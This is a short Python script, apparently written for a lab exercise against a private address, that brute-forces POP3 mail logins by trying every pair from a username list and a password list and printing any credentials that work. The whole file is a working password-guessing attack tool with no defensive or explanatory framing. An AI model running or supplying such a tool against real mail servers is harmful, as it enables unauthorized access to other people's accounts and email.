import poplib
import time

def pop3_bruteforce(host,port,user_file,pass_file):
	with open(user_file,"r") as uf:
		usernames=[line.strip() for line in uf if line.strip()]
	with open(pass_file,"r") as pf:
		passwords = [line.strip() for line in pf if line.strip()]

	for username in usernames:
		for password in passwords:
			try:
				pop_conn = poplib.POP3(host,port,timeout=10)
				banner = pop_conn.getwelcome().decode(errors="ignore")
				print(banner)
				pop_conn.set_debuglevel(1)
				pop_conn.user(username)

				resp = pop_conn.pass_(password)


				if b"+OK" in resp:
					print(f"success: {username}:{password}")
					pop_conn.quit()
					return
				else:
					print(f"[-] Failed: {username}:{password}")

				pop_conn.quit()

			except poplib.error_proto as e:
				print(f"[!] Protocol error for {username}:{password} -> {e}")
				time.sleep(5)
			except Exception as e:
				print(f"[!] Error for {username}:{password} -> {e}")
				time.sleep(5)

			time.sleep(5)
if __name__ == "__main__":
	host = "10.201.66.227"
	port = 110
	user_file = "users.txt"
	pass_file = "passes.txt"

pop3_bruteforce(host,port,user_file,pass_file)
